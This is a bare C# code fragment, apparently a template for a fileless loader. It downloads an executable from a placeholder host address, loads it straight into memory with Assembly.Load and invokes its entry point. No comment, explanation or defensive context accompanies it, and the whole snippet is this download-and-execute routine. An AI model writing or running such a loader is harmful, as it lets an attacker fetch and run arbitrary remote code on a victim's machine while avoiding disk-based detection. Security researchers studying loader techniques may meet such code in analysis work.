var webClient = new System.Net.WebClient();
var data = webClient.DownloadData("http://{IP}/NAME.exe");
try
{
	MethodInfo target = Assembly.Load(data).EntryPoint;
	target.Invoke(null, new object[] { null });
}
catch (Exception ex)
{
	Console.WriteLine(ex.Message);
}
